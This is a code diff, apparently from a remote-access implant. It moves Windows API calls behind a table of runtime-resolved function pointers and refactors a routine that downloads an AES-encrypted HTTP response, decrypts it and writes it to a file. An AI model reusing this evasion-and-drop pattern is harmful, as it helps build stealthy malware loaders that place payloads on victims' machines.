@@ -136,7 +136,7 @@ namespace System::Http
 				}
 				else
 				{
-					ZeroMemory(tempBuffer, dwSize+1);
+					pProcs->lpRtlZeroMemory(tempBuffer, dwSize+1);
 					if (pProcs->lpWinHttpReadData(hRequest, (LPVOID)tempBuffer, dwSize, &dwDownloaded))
 					{
 						// Add to buffer;
@@ -180,7 +180,7 @@ namespace System::Http
 			}
 
 			// Read the data
-			ZeroMemory(pszOutBuffer, dwSize+1);
+			pProcs->lpRtlZeroMemory(pszOutBuffer, dwSize+1);
 			if (!pProcs->lpWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwRead))
 			{
 				break;
@@ -230,21 +230,6 @@ namespace System::Http
 			return FALSE;
 		}
 
-		// std::ofstream outFile(sFile, std::ios::binary);
-		HANDLE hFile = CreateFileW(
-			wDest.c_str(),
-			GENERIC_WRITE,
-			0,
-			NULL,
-			CREATE_ALWAYS,
-			FILE_ATTRIBUTE_NORMAL,
-			NULL
-		);
-		if (hFile == INVALID_HANDLE_VALUE)
-		{
-			return FALSE;
-		}
-
 		// Read file
 		std::wstring wEnc = ReadResponseText(pProcs, resp.hRequest);
 		if (wEnc.length() == 0)
@@ -256,15 +241,13 @@ namespace System::Http
 		std::vector<BYTE> decBytes = Crypt::Decrypt(wEnc, pCrypt->pAES->hKey, pCrypt->pAES->iv);
 		
 		// Write data to file
-		DWORD dwWritten;
-		if (!WriteFile(hFile, decBytes.data(), decBytes.size(), &dwWritten, NULL))
-		{
-			CloseHandle(hFile);
+		if (!System::Fs::WriteBytesToFile(
+			pProcs,
+			wDest,
+			decBytes
+		)) {
 			return FALSE;
 		}
-
-		// outFile.close();
-		CloseHandle(hFile);
 
 		return TRUE;
 	}
